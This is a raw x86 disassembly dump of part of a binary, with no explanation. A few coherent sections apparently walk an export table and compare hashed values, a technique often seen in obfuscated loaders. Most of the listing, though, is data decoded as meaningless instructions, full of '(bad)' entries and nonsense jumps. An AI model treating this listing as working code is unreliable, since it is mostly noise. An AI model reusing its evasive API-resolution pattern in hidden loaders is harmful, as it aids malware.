  40b4c1:	mov    bl,0x14
  40b4c3:	test   DWORD PTR [edx+0x1e],ebp
  40b4c6:	fnstenv [ecx+0x6f]
  40b4c9:	test   BYTE PTR [edx],ah
  40b4cb:	(bad)  
  40b4cc:	js     0x40b496
  40b4ce:	mov    esi,0x9c6ffc81
  40b4d3:	stos   DWORD PTR es:[edi],eax
  40b4d4:	sub    BYTE PTR [ecx+0x458bd44d],cl
  40b4da:	in     al,dx
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	mov    ebp,0xe8b53789
  40b50c:	lock jle 0x40b58d
  40b50f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b513:	xchg   esi,eax
  40b514:	in     eax,0x9b
  40b516:	sub    al,dh
  40b518:	cmp    esi,DWORD PTR [ebp+0x78485b]
  40b51e:	sub    al,0x40
  40b520:	and    al,0x95
  40b522:	adc    BYTE PTR [edi*2+0x18dcfecf],ch
  40b529:	cmp    eax,0x55789884
  40b52e:	scas   eax,DWORD PTR es:[edi]
  40b52f:	bound  ebp,QWORD PTR ds:0x858db96c
  40b535:	xchg   esp,eax
  40b536:	inc    ecx
  40b537:	sbb    ch,BYTE PTR [edx-0x3929c59e]
  40b53d:	or     DWORD PTR [ebx-0x1e],edi
  40b540:	in     eax,0xef
  40b542:	adc    BYTE PTR [edx-0x67ee82ae],0xa2
  40b549:	in     al,dx
  40b54a:	arpl   WORD PTR [edx+0x76e7f585],cx
  40b550:	(bad)  
  40b551:	aam    0x70
  40b553:	bound  ebp,QWORD PTR [edi]
  40b555:	mov    eax,ds:0xfe9c9687
  40b55a:	push   ds
  40b55b:	sub    eax,0xffadf577
  40b560:	mov    DWORD PTR [esi+0x28],esp
  40b563:	cmc    
  40b564:	push   ss
  40b565:	out    0x85,al
  40b567:	fist   DWORD PTR [eax-0x1c]
  40b56a:	or     eax,DWORD PTR [esi+0x2b6d3332]
  40b570:	jecxz  0x40b521
  40b572:	jp     0x40b54a
  40b574:	mov    esp,0x8e75712b
  40b579:	out    dx,al
  40b57a:	mov    DWORD PTR [ecx],ebx
  40b57c:	imul   ecx,DWORD PTR [edx+eax*2],0x9798a7ba
  40b583:	aas    
  40b584:	icebp  
  40b585:	into   
  40b586:	sti    
  40b587:	hlt    
  40b588:	or     ch,ch
  40b58a:	push   eax
  40b58b:	dec    ebx
  40b58c:	ficom  DWORD PTR [ecx]
  40b58e:	push   esi
  40b58f:	cmp    ax,0x21ea
  40b593:	aas    
  40b594:	xchg   BYTE PTR [ebx-0x17],ch
  40b597:	(bad)  
  40b598:	xlat   BYTE PTR ds:[ebx]
  40b599:	cmp    DWORD PTR [eax],edi
  40b59b:	cli    
  40b59c:	imul   ebx,DWORD PTR [ebp+0x310d0e17],0x4a
  40b5a3:	gs push esp
  40b5a5:	and    esp,DWORD PTR [esi]
  40b5a7:	shl    BYTE PTR [ecx],0x59
  40b5aa:	stc    
  40b5ab:	mov    eax,0x32b7cfac
  40b5b0:	arpl   WORD PTR [esi+0x19],ax
  40b5b3:	jns    0x40b582
  40b5b5:	mov    esi,ebp
  40b5b7:	inc    eax
  40b5b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5b9:	pop    ds
  40b5ba:	dec    esi
  40b5bb:	pop    eax
  40b5bc:	int3   
  40b5bd:	adc    al,0x38
  40b5bf:	inc    ebx
  40b5c0:	stos   DWORD PTR es:[edi],eax
  40b5c1:	xlat   BYTE PTR ds:[ebx]
  40b5c2:	(bad)  
  40b5c4:	mov    eax,ds:0xf15d3695
  40b5c9:	push   ss
  40b5ca:	es pop ecx
  40b5cc:	dec    edi
  40b5cd:	in     eax,dx
  40b5ce:	cmp    DWORD PTR [ecx+ebp*8+0x9012778],ecx
  40b5d5:	mov    dl,0x33
  40b5d7:	push   eax
  40b5d8:	loopne 0x40b572
  40b5da:	sbb    DWORD PTR [edx-0x4f797c2c],esp
  40b5e0:	xchg   DWORD PTR [edi],ebp
  40b5e2:	(bad)  
  40b5e3:	arpl   cx,dx
  40b5e5:	cli    
  40b5e6:	(bad)  
  40b5e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5e8:	mov    BYTE PTR [eax-0x3e],dh
  40b5eb:	pop    edi
  40b5ec:	lea    esi,[ecx-0x5e]
  40b5ef:	bound  esp,QWORD PTR [ebx]
  40b5f1:	adc    al,0xf0
  40b5f3:	pop    esp
  40b5f4:	xor    DWORD PTR [eax-0x4b],ebp
  40b5f7:	fistp  QWORD PTR [ebx+0x168cc598]
  40b5fd:	push   0x4
  40b5ff:	xchg   edi,eax
  40b600:	mov    WORD PTR [edi],cs
  40b602:	inc    ebp
  40b603:	pop    edx
  40b604:	jb     0x40b5f9
  40b606:	sub    al,0x3e
  40b608:	mov    ds:0x48d4e208,eax
  40b60d:	pusha  
  40b60e:	test   eax,0xe3e4004d
  40b613:	inc    edi
  40b614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b615:	pop    esp
  40b616:	imul   edi,DWORD PTR ds:0x1b399698,0xffffffdf
  40b61d:	sbb    BYTE PTR [ecx+ecx*8+0x16],al
  40b621:	out    dx,eax
  40b622:	dec    ecx
  40b623:	or     edi,DWORD PTR [esi-0xc605082]
  40b629:	cld    
  40b62a:	pop    esp
  40b62b:	icebp  
  40b62c:	pop    esi
  40b62d:	(bad)
  40b630:	adc    eax,esp
  40b632:	daa    
  40b633:	xchg   edx,eax
  40b634:	outs   dx,BYTE PTR ds:[esi]
  40b635:	sbb    DWORD PTR [edi-0x21],ecx
  40b638:	xchg   ecx,eax
  40b639:	and    cl,bh
  40b63b:	(bad)  
  40b63c:	popa   
  40b63d:	cli    
  40b63e:	rol    DWORD PTR [ecx-0x42],cl
  40b641:	mov    ch,ch
  40b643:	stc    
  40b644:	das    
  40b645:	repz mov cl,0x63
  40b648:	imul   ecx,esp,0x98d4f5c2
  40b64e:	cdq    
  40b64f:	loopne 0x40b5f1
  40b651:	sti    
  40b652:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b653:	pop    ecx
  40b654:	rcr    DWORD PTR [edx+0x74063a01],0x6
  40b65b:	loope  0x40b691
  40b65d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b65e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b65f:	adc    eax,0x130645af
  40b664:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b665:	retf   0x1b50
  40b668:	(bad)  [edx+0x4f]
  40b66b:	adc    eax,0xab9c2342
  40b670:	jecxz  0x40b620
  40b672:	jmp    0xdcb5f1b7
  40b677:	inc    esi
  40b678:	dec    esp
  40b679:	into   
  40b67a:	int3   
  40b67b:	mov    edi,DWORD PTR ds:0xe0d8497f
  40b681:	hlt    
  40b682:	mov    dl,0xd7
  40b684:	(bad)  
  40b685:	xchg   esp,eax
  40b686:	sub    eax,0xf3692752
  40b68b:	mov    ebx,0x607b15d1
  40b690:	scas   eax,DWORD PTR es:[edi]
  40b691:	mov    db0,esi
  40b694:	sbb    edx,esi
  40b696:	jle    0x40b6d4
  40b698:	fcomp  DWORD PTR [ebp+0x3]
  40b69b:	push   esi
  40b69c:	hlt    
  40b69d:	adc    eax,0xe1157ecc
  40b6a2:	cmp    bl,BYTE PTR [edi-0x22]
  40b6a5:	mov    bh,0x12
  40b6a7:	lods   al,BYTE PTR ds:[esi]
  40b6a8:	inc    eax
  40b6a9:	jbe    0x40b66e
  40b6ab:	(bad)  
  40b6ac:	arpl   di,di
  40b6ae:	repz dec eax
  40b6b0:	and    BYTE PTR [esi],al
  40b6b2:	rcl    edx,1
  40b6b4:	inc    ebp
  40b6b5:	(bad)  
  40b6b6:	fsub   QWORD PTR [esi]
  40b6b8:	jge    0x40b676
  40b6ba:	shl    BYTE PTR [edx],0xf3
  40b6bd:	push   es
  40b6be:	sbb    eax,0x3d9ab08c
  40b6c3:	in     al,dx
  40b6c4:	fsub   QWORD PTR [ebp+0x5e]
  40b6c7:	test   DWORD PTR [eax-0x77],ebp
  40b6ca:	cli    
  40b6cb:	fisubr WORD PTR [ebx]
  40b6cd:	clc    
  40b6ce:	inc    ebp
  40b6cf:	jp     0x40b70e
  40b6d1:	push   esp
  40b6d2:	imul   DWORD PTR ds:0x60955a94
  40b6d8:	das    
  40b6d9:	mov    al,ds:0xf7ad4cd0
  40b6de:	int3   
  40b6df:	lea    eax,[esp+eax*1+0x3]
  40b6e3:	aad    0x8c
  40b6e5:	pop    edx
  40b6e6:	xchg   edi,eax
  40b6e7:	and    eax,0xcdbe4979
  40b6ec:	test   bh,ah
  40b6ee:	jnp    0x40b76c
  40b6f0:	and    ebx,esp
  40b6f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6f3:	mov    ch,0x6e
  40b6f5:	les    esi,FWORD PTR [edx+0x72a1213d]
  40b6fb:	out    0x3f,eax
  40b6fd:	(bad)  
  40b6fe:	ret    
  40b6ff:	pop    eax
  40b700:	lods   eax,DWORD PTR ds:[esi]
  40b701:	add    al,0x35
  40b703:	int    0x86
  40b705:	fild   DWORD PTR [esi+0x28969b7b]
  40b70b:	push   ss
  40b70c:	loope  0x40b742
  40b70e:	das    
  40b70f:	or     DWORD PTR ss:[ecx+0x7703552b],0x47
  40b717:	popf   
  40b718:	and    ecx,esi
  40b71a:	or     bh,0x8
  40b71d:	imul   ebx,DWORD PTR [edi],0xffffffd3
  40b720:	dec    ebx
  40b721:	push   edx
  40b722:	push   ebp
  40b723:	push   es
  40b724:	out    0xf6,eax
  40b726:	mov    eax,0x7851a319
  40b72b:	sbb    eax,0x4476fb18
  40b730:	jo     0x40b6e8
  40b732:	(bad)  [edx]
  40b734:	xor    esi,ecx
  40b736:	clc    
  40b737:	mov    ch,0x94
  40b739:	mov    es,WORD PTR [ebx-0x22b9a1e4]
  40b73f:	mov    al,ds:0x8c5fa3ce
  40b744:	sub    al,BYTE PTR [eax]
  40b746:	jge    0x40b79a
  40b748:	(bad)  
  40b749:	xchg   edi,eax
  40b74a:	or     cl,ch
  40b74c:	jnp    0x40b6da
  40b74e:	or     DWORD PTR [edi],eax
  40b750:	lds    ebp,FWORD PTR [ebx-0x38]
  40b753:	in     al,dx
  40b754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b755:	int    0xa2
  40b757:	sbb    dh,BYTE PTR [ebx]
  40b759:	push   DWORD PTR [ebp-0x30]
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	pop    ebx
  40b78b:	pusha  
  40b78c:	js     0x40b761
  40b78e:	mov    dl,0xfe
  40b790:	jle    0x40b810
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b797:	pop    ecx
  40b798:	and    DWORD PTR [ecx],0xbf6c4650
  40b79e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b79f:	lahf   
  40b7a0:	xchg   ebx,eax
  40b7a1:	adc    cl,BYTE PTR [edi]
  40b7a3:	pop    esi
  40b7a4:	es (bad) 
  40b7a6:	pop    esi
  40b7a7:	je     0x40b7e5
  40b7a9:	or     DWORD PTR [edx+0x4a1dec6c],edx
  40b7af:	mov    edx,ebx
  40b7b1:	mov    al,ds:0x4257415c
  40b7b6:	mov    eax,ds:0xa233605a
  40b7bb:	(bad)  
  40b7bc:	cmp    ebp,DWORD PTR [edi+ebx*4-0x763b8c31]
  40b7c3:	into   
  40b7c4:	sbb    eax,0xe401e12
  40b7c9:	fstp   DWORD PTR fs:[ebx+0x2e9d5740]
  40b7d0:	shl    BYTE PTR [edi+0x255915e0],0x23
  40b7d7:	nop
  40b7d8:	sbb    al,0x0
  40b7da:	jmp    FWORD PTR [ebx+eax*2-0x485e94e8]
  40b7e1:	and    bl,cl
  40b7e3:	mov    dh,0xfd
  40b7e5:	sbb    DWORD PTR [esi],0x7a
  40b7e8:	xor    ah,BYTE PTR [ecx+0x6d]
  40b7eb:	ins    DWORD PTR es:[edi],dx
  40b7ec:	xchg   BYTE PTR [edx+0x37],al
  40b7ef:	and    al,0xa0
  40b7f1:	mov    ds:0x8e037c5a,eax
  40b7f6:	sbb    dl,bl
  40b7f8:	sub    BYTE PTR [ebx],bl
  40b7fa:	mov    ebp,0xdfb28e94
  40b7ff:	jg     0x40b7ed
  40b801:	mov    bh,0x77
  40b803:	icebp  
  40b804:	pop    ds
  40b805:	pop    ebx
  40b806:	aas    
  40b807:	bound  edx,QWORD PTR ds:0xc07c907e
  40b80d:	xchg   edi,eax
  40b80e:	pop    edx
  40b80f:	sub    esi,DWORD PTR [eax+ecx*8]
  40b812:	cmp    eax,0x475ce4f2
  40b817:	and    BYTE PTR [ecx+0x685b74f9],ah
  40b81d:	mov    ebx,0x892f10c
  40b822:	dec    esp
  40b823:	stc    
  40b824:	pop    edi
  40b825:	ror    BYTE PTR [eiz*4+0x778f49ed],0x17
  40b82d:	ds inc eax
  40b82f:	imul   DWORD PTR [esi-0x4c]
  40b832:	xor    eax,0xed7e61be
  40b837:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b838:	mov    dh,BYTE PTR [eax-0x7e4c4681]
  40b83e:	inc    ebp
  40b83f:	loopne 0x40b875
  40b841:	stc    
  40b842:	stos   BYTE PTR es:[edi],al
  40b843:	loopne 0x40b809
  40b845:	or     BYTE PTR ds:0xb9573c48,cl
  40b84b:	stos   DWORD PTR es:[edi],eax
  40b84c:	jnp    0x40b83d
  40b84e:	ret    
  40b84f:	mov    dh,0x11
  40b851:	(bad)  
  40b853:	and    eax,0x6f7bca
  40b858:	pusha  
  40b859:	repz xor DWORD PTR [esi-0x10],ecx
  40b85d:	test   al,0x4a
  40b85f:	xor    BYTE PTR [edi],0x46
  40b862:	xchg   edx,eax
  40b863:	and    bh,BYTE PTR [esi+eax*2-0x70]
  40b867:	jmp    0x62889b7f
  40b86c:	cmp    BYTE PTR [edi+0x38],0xf1
  40b870:	shl    DWORD PTR [ebx+esi*1-0x4026e738],1
  40b877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b878:	jbe    0x40b8a8
  40b87a:	mov    ah,0x7d
  40b87c:	or     al,0xb0
  40b87e:	(bad)  [ebx-0x28c7fc05]
  40b884:	pop    ecx
  40b885:	jo     0x40b873
  40b887:	mov    eax,0x1b8db94a
  40b88c:	or     BYTE PTR [ecx+ecx*2-0x1e0fe669],0x40
  40b894:	stos   DWORD PTR es:[edi],eax
  40b895:	rcr    DWORD PTR [ebp+0x711e5106],cl
  40b89b:	dec    edx
  40b89c:	mov    ch,0x29
  40b89e:	data16 fsubr st(0),st
  40b8a1:	cld    
  40b8a2:	sub    edx,edi
  40b8a4:	xor    eax,esi
  40b8a6:	xchg   DWORD PTR [esi+0x74e38f57],edx
  40b8ac:	xor    DWORD PTR ds:0xaf219277,esp
  40b8b2:	pop    ebp
  40b8b3:	mov    WORD PTR [eax-0x3b],cs
  40b8b6:	xchg   BYTE PTR [eax],cl
  40b8b8:	stos   DWORD PTR es:[edi],eax
  40b8b9:	pop    ebp
  40b8ba:	inc    eax
  40b8bb:	mov    cs:0x9f30d0f4,eax
  40b8c1:	xchg   DWORD PTR [ebx-0x42],ebx
  40b8c4:	xchg   BYTE PTR [esi],dh
  40b8c6:	jb     0x40b88b
  40b8c8:	aas    
  40b8c9:	test   BYTE PTR [ecx],al
  40b8cb:	mov    dl,0x62
  40b8cd:	cmp    DWORD PTR [edx+eax*4],edi
  40b8d0:	retf   0x2b32
  40b8d3:	jp     0x40b8cd
  40b8d5:	mov    eax,ds:0x61d709d5
  40b8da:	cmp    dl,BYTE PTR [ebx-0x1058a03e]
  40b8e0:	sbb    cl,BYTE PTR [ecx-0x6957f147]
  40b8e6:	mov    edi,0x812b15cf
  40b8eb:	pop    ecx
  40b8ec:	loope  0x40b931
  40b8ee:	mov    ds:0x1a5fa449,eax
  40b8f3:	aas    
  40b8f4:	es jl  0x40b91f
  40b8f7:	inc    esp
  40b8f8:	jecxz  0x40b8d1
  40b8fa:	rcr    ebx,0x58
  40b8fd:	or     esp,ecx
  40b8ff:	mov    ecx,0xefacc717
  40b904:	iret   
  40b905:	inc    esp
  40b906:	aaa    
  40b907:	repz dec esi
  40b909:	jmp    0x31bf:0xd0f597dd
  40b910:	mov    dl,0x38
  40b912:	jp     0x40b8a3
  40b914:	push   eax
  40b915:	(bad)  
  40b916:	in     eax,0x48
  40b918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b919:	leave  
  40b91a:	push   es
  40b91b:	jne    0x40b8d9
  40b91d:	jmp    FWORD PTR [ecx*1-0x374f5e15]
  40b924:	out    0x37,al
  40b926:	add    BYTE PTR [edx],ch
  40b928:	bound  edi,QWORD PTR [edx+0x1e]
  40b92b:	mov    dh,0x3b
  40b92d:	das    
  40b92e:	cmp    DWORD PTR [esi+eiz*1-0x3d],ebx
  40b932:	sahf   
  40b933:	cmc    
  40b934:	jo     0x40b99a
  40b936:	js     0x40b920
  40b938:	jp     0x40b8c9
  40b93a:	popf   
  40b93b:	mov    bh,0x30
  40b93d:	dec    eax
  40b93e:	xchg   edx,eax
  40b93f:	jnp    0x40b970
  40b941:	mov    ds:0xd5255992,eax
  40b946:	cld    
  40b947:	dec    edx
  40b948:	add    al,0xbc
  40b94a:	mov    DWORD PTR [ebp-0x1bd14ab7],eax
  40b950:	inc    ebx
  40b951:	and    ecx,DWORD PTR [edi]
  40b953:	jl     0x40b94f
  40b955:	sub    eax,0xf2734659
  40b95a:	push   ss
  40b95b:	or     eax,0xd6232c7f
  40b960:	es daa 
  40b962:	jnp    0x40b8ff
  40b964:	push   edi
  40b965:	mov    ecx,0xf1351576
  40b96a:	jnp    0x40b9b5
  40b96c:	sbb    ecx,DWORD PTR [ebx+0x21]
  40b96f:	mov    esp,0x98324379
  40b974:	push   esp
  40b975:	sub    cl,bl
  40b977:	adc    eax,0xb59a27b8
  40b97c:	fmulp  st(7),st
  40b97e:	shl    bh,cl
  40b980:	pop    ss
  40b981:	xchg   ecx,eax
  40b982:	or     eax,0x65b8d331
  40b987:	fcomp  QWORD PTR [esi-0x568e20fd]
  40b98d:	pop    fs
  40b98f:	test   BYTE PTR [esi],bh
  40b991:	push   ss
  40b992:	outs   dx,BYTE PTR ds:[esi]
  40b993:	push   cs
  40b994:	imul   BYTE PTR ds:0xadd36426
  40b99a:	pop    ecx
  40b99b:	mov    esp,0x428b80f0
  40b9a0:	cmp    edx,ebx
  40b9a2:	div    DWORD PTR [edx+0x66d7f8cb]
  40b9a8:	jp     0x40b9eb
  40b9aa:	ds jno 0x40b9e3
  40b9ad:	pop    es
  40b9ae:	outs   dx,BYTE PTR ds:[esi]
  40b9af:	sub    DWORD PTR [eax+0x41dc15b8],0x5b
  40b9b6:	xchg   ecx,eax
  40b9b7:	(bad)  
  40b9b8:	mov    bl,0x26
  40b9ba:	test   DWORD PTR [ecx-0x78],ecx
  40b9bd:	jecxz  0x40b9de
  40b9bf:	jae    0x40b9d7
  40b9c1:	jecxz  0x40b94c
  40b9c3:	cmp    bl,BYTE PTR [ebx-0x6c2a7fe8]
  40b9c9:	fcmove st,st(2)
  40b9cb:	push   esp
  40b9cc:	sub    ch,BYTE PTR [ebx+eiz*2+0x27f58936]
  40b9d3:	adc    ebp,DWORD PTR [ebp-0x48a47075]
  40b9d9:	add    cl,BYTE PTR [edi+0x65]
  40b9dc:	mov    eax,DWORD PTR [ebp-0x20]
  40b9df:	inc    edi
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8-0x1edd57f8],eax
  40ba0f:	fimul  WORD PTR [edi]
  40ba11:	jl     0x40ba10
  40ba13:	jle    0x40ba93
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	fidivr WORD PTR [esi+0x5c098f48]
  40ba1f:	sti    
  40ba20:	scas   al,BYTE PTR es:[edi]
  40ba21:	jae    0x40ba51
  40ba23:	call   0x66c98231
  40ba28:	cli    
  40ba29:	(bad)  
  40ba2a:	pop    ebp
  40ba2b:	or     eax,0x59a6a9b6
  40ba30:	pushf  
  40ba31:	cmp    eax,0xcd16b0a7
  40ba36:	ds lock mov ch,0xff
  40ba3a:	out    dx,eax
  40ba3b:	push   edx
  40ba3c:	mov    dh,0x8
  40ba3e:	addr16 loop 0x40b9f7
  40ba41:	add    BYTE PTR [ecx],al
  40ba43:	cmp    eax,0x21870829
  40ba48:	push   esp
  40ba49:	mov    ds:0x45c9cf39,eax
  40ba4e:	jno    0x40ba54
  40ba50:	inc    ebp
  40ba51:	sub    BYTE PTR [ecx],bh
  40ba53:	repz push ss
  40ba55:	inc    ecx
  40ba56:	inc    ecx
  40ba57:	ins    BYTE PTR es:[edi],dx
  40ba58:	jmp    0x7b1f:0xabdcbbc9
  40ba5f:	dec    eax
  40ba60:	(bad)  
  40ba62:	xchg   ecx,eax
  40ba63:	xor    al,0x64
  40ba65:	push   ecx
  40ba66:	(bad)  
  40ba67:	fisttp QWORD PTR [ebx-0x22]
  40ba6a:	pop    ecx
  40ba6b:	jle    0x40ba7b
  40ba6d:	sub    BYTE PTR [ebx+0x55],ah
  40ba70:	or     DWORD PTR [ebp+0x339f6a0b],eax
  40ba76:	sti    
  40ba77:	dec    esp
  40ba78:	enter  0x2684,0xad
  40ba7c:	sub    DWORD PTR [edi-0x4e],ecx
  40ba7f:	mov    ecx,0x6da69328
  40ba84:	push   ebp
  40ba85:	sub    eax,0xecf1096a
  40ba8a:	fidiv  DWORD PTR ds:0xea4f208a
  40ba90:	(bad)  
  40ba91:	xor    esi,DWORD PTR [edi+ebp*2-0x55]
  40ba95:	outs   dx,BYTE PTR ds:[esi]
  40ba96:	mov    ebp,0x86c6e3f8
  40ba9b:	sbb    bh,BYTE PTR [esi+0x5d]
  40ba9e:	cmp    al,0xc5
  40baa0:	and    eax,0x24ae75f8
  40baa5:	fisubr WORD PTR [edx]
  40baa7:	adc    al,0x35
  40baa9:	push   ebp
  40baaa:	jo     0x40bb11
  40baac:	jbe    0x40bb08
  40baae:	sub    al,BYTE PTR [ecx-0x64]
  40bab1:	arpl   di,cx
  40bab3:	(bad)  
  40bab4:	repnz add eax,ebp
  40bab7:	cs and al,0x11
  40baba:	sub    bl,BYTE PTR [ecx+0x11]
  40babd:	add    eax,0xdf8e6209
  40bac2:	push   cs
  40bac3:	inc    esp
  40bac4:	cmp    ecx,DWORD PTR [ecx]
  40bac6:	adc    ch,ch
  40bac8:	cmp    BYTE PTR [edi],0x99
  40bacb:	pushf  
  40bacc:	imul   ebx,DWORD PTR [esi+edx*2],0x1464662c
  40bad3:	cmp    DWORD PTR [edi-0x1ee4ddf9],esi
  40bad9:	pushf  
  40bada:	push   edx
  40badb:	imul   ah
  40badd:	mov    edi,0x9b06b4c
  40bae2:	adc    esp,DWORD PTR [eax+0xa43f758]
  40bae8:	adc    DWORD PTR [edx],esp
  40baea:	test   al,0xb4
  40baec:	repnz dec esp
  40baee:	xchg   esi,eax
  40baef:	cmp    eax,DWORD PTR ds:0x97825c97
  40baf5:	sbb    cl,0xb8
  40baf8:	lods   al,BYTE PTR ds:[esi]
  40baf9:	cli    
  40bafa:	(bad)  
  40bafc:	pop    esi
  40bafd:	nop
  40bafe:	push   esp
  40baff:	mov    ebx,0x345efabe
  40bb04:	shr    ebx,1
  40bb06:	dec    edi
  40bb07:	jae    0x40bb5b
  40bb09:	xchg   edx,eax
  40bb0a:	ret    
  40bb0b:	fisttp WORD PTR [edi+0x6efdb85c]
  40bb11:	stc    
  40bb12:	popa   
  40bb13:	adc    sp,WORD PTR [edx+0x4]
  40bb17:	mov    ah,BYTE PTR [edx-0x67]
  40bb1a:	mov    ecx,0xbf4d8c48
  40bb1f:	jne    0x40baad
  40bb21:	and    BYTE PTR [edx],bl
  40bb23:	mov    ch,0x57
  40bb25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb26:	retf   0xfe9f
  40bb29:	aas    
  40bb2a:	rcl    ah,0x37
  40bb2d:	in     eax,dx
  40bb2e:	dec    eax
  40bb2f:	push   eax
  40bb30:	leave  
  40bb31:	dec    ebp
  40bb32:	sbb    al,0x75
  40bb34:	pushf  
  40bb35:	(bad)  
  40bb36:	xor    edx,ecx
  40bb38:	rol    edi,cl
  40bb3a:	inc    ebx
  40bb3b:	inc    esi
  40bb3c:	lods   eax,DWORD PTR ds:[esi]
  40bb3d:	mov    WORD PTR [ecx+0x12],ds
  40bb40:	in     al,0xcc
  40bb42:	gs (bad) 
  40bb44:	pop    esi
  40bb45:	and    al,BYTE PTR [edi]
  40bb47:	cmp    ah,cl
  40bb49:	pop    DWORD PTR [edx+0x4c3e51f5]
  40bb4f:	in     eax,0xb
  40bb51:	mov    esp,DWORD PTR [ebp-0x395d8a91]
  40bb57:	push   es
  40bb58:	pop    ebx
  40bb59:	push   ss
  40bb5a:	or     eax,0xc2c72a4b
  40bb5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb60:	mov    al,ds:0x510b597b
  40bb65:	sub    dh,BYTE PTR [esp+edx*2]
  40bb68:	popf   
  40bb69:	leave  
  40bb6a:	inc    esi
  40bb6b:	sub    eax,0x46c47d92
  40bb70:	dec    ebx
  40bb71:	add    ebp,DWORD PTR [eax+ebx*8]
  40bb74:	lea    ecx,[edi+ebx*4]
  40bb77:	adc    eax,0xba176f83
  40bb7c:	jne    0x40bb66
  40bb7e:	in     eax,0xbb
  40bb80:	test   eax,0xd8b8581
  40bb85:	aam    0x45
  40bb87:	sub    al,0x98
  40bb89:	adc    ah,BYTE PTR ds:0x49fd0fe4
  40bb8f:	pusha  
  40bb90:	test   BYTE PTR [edx+ebx*4+0x3178f6e4],ch
  40bb97:	aad    0xcb
  40bb99:	pop    esi
  40bb9a:	imul   ebp,DWORD PTR [edx],0x40
  40bb9d:	jge    0x40bbf9
  40bb9f:	sbb    DWORD PTR [esi],eax
  40bba1:	das    
  40bba2:	aam    0xe2
  40bba4:	cwde   
  40bba5:	loop   0x40bc01
  40bba7:	int3   
  40bba8:	fidivr WORD PTR [ebx]
  40bbaa:	sub    al,0x2a
  40bbac:	adc    BYTE PTR [edi-0xf9e34a3],bh
  40bbb2:	pop    ss
  40bbb3:	xor    al,0x3b
  40bbb5:	push   eax
  40bbb6:	adc    ecx,DWORD PTR [ecx]
  40bbb8:	jecxz  0x40bc0d
  40bbba:	mov    dl,0x79
  40bbbc:	dec    esi
  40bbbd:	lods   al,BYTE PTR ds:[esi]
  40bbbe:	ins    DWORD PTR es:[edi],dx
  40bbbf:	xor    eax,0x76c4af9f
  40bbc4:	pop    ebp
  40bbc5:	xor    al,0x54
  40bbc7:	loopne 0x40bc31
  40bbc9:	stos   BYTE PTR es:[edi],al
  40bbca:	and    DWORD PTR [eax],0xb4fd4b8d
  40bbd0:	loope  0x40bbbd
  40bbd2:	sti    
  40bbd3:	aas    
  40bbd4:	neg    BYTE PTR [edx+0x17be01c9]
  40bbda:	cld    
  40bbdb:	or     DWORD PTR [ecx+0x71],esi
  40bbde:	fs push 0x1a
  40bbe1:	cmp    eax,0x582b5e49
  40bbe6:	xor    cl,ah
  40bbe8:	sbb    BYTE PTR [edx+0x76],cl
  40bbeb:	jmp    0xa811b034
  40bbf0:	mov    ds:0xb7e04301,eax
  40bbf5:	into   
  40bbf6:	xchg   esi,eax
  40bbf7:	or     eax,0xd7274ed8
  40bbfc:	push   ds
  40bbfd:	sub    al,0xb
  40bbff:	leave  
  40bc00:	pop    edx
  40bc01:	mov    eax,ds:0xea41d5a
  40bc06:	xor    BYTE PTR [ecx],bl
  40bc08:	mov    bh,0x2
  40bc0a:	fidiv  WORD PTR [eax]
  40bc0c:	loopne 0x40bc32
  40bc0e:	and    ah,cl
  40bc10:	inc    edi
  40bc11:	test   esi,ebp
  40bc13:	shl    BYTE PTR [ebx+eax*4+0x6882e117],0x63
  40bc1b:	mov    ebx,0x37a696f
  40bc20:	mov    ah,0x2a
